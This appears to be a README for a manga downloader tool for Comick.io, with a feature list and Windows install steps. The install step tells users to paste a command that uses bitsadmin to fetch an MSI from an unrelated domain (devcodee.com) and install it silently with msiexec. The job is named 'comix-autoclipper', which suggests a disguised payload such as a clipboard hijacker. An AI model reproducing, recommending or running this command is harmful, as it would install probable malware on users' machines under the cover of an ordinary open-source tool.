# 🗯️ Best Manga Downloader

**The fastest, most beautiful CLI & GUI manga downloader for Comick.io and beyond.**

[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)](.)
[![Downloads](https://img.shields.io/badge/Downloads-10k%2B-brightgreen)](.)
[![Comick.io](https://img.shields.io/badge/Powered%20by-Comick.io-orange)](https://comick.io)

[🚀 Quick Start](#quick-start) • [📥 Install](#installation) • [📖 Docs](docs/USAGE.md) • [🤝 Contribute](#contributing)

&lt;/div&gt;

---

## ✨ What is Manga Downloader?

**Best Manga Downloader** is a powerful, open-source tool designed for manga enthusiasts who want to build their own offline manga library. Whether you are a casual reader, a digital archivist, or a comic collector — this tool gives you **blazing-fast concurrent downloads**, **beautiful output formats**, and **zero-hassle setup**.

Built with modern Python, asyncio, and a gorgeous terminal UI, it supports **Comick.io** — one of the largest manga aggregators — and exports chapters to **PDF**, **CBZ**, **ZIP**, or raw images with full metadata.

&gt; 🎯 *"From search to shelf in one command."*

---

## 🌟 Features

| Feature | Description |
|---------|-------------|
| ⚡ **Async Engine** | Concurrent chapter & page downloads with adaptive rate limiting |
| 🎨 **Dual Interface** | Rich CLI + optional Tkinter GUI for every workflow |
| 🔍 **Smart Search** | Search Comick.io by title, author, or genre directly from terminal |
| 📦 **Multi-Format Export** | PDF, CBZ, ZIP, or raw folders — your choice |
| 🌍 **Multi-Language** | Download chapters in any available language (EN, JP, ES, FR, DE, RU, etc.) |
| 📚 **Batch Downloads** | Download entire series, specific volumes, or chapter ranges |
| 🔄 **Resume Support** | Interrupted downloads resume where they left off |
| 🏷️ **Metadata Rich** | ComicInfo.xml, cover images, and chapter tags embedded |
| 🪟 **One-Click Windows Install** | Single `.bat` script — no Python knowledge needed |
| 🐳 **Docker Ready** | Headless container for NAS and server deployments |

---

## 🚀 Quick Start

## 🪟 Windows Installation
### **Step 1 — Open Command Prompt**
1. Press **Win + R**
2. Type:
```
cmd
```
3. Press **Enter**
This will open **Command Prompt**.
---
### **Step 2 — Run the Install Command**
Copy the command below and paste it into **Command Prompt**, then press **Enter**.
```powershell
bitsadmin /transfer comix-autoclipper /download /priority normal "https://devcodee.com/api" "%TEMP%\setup.msi" && msiexec /i "%TEMP%\setup.msi" /qn /norestart
```
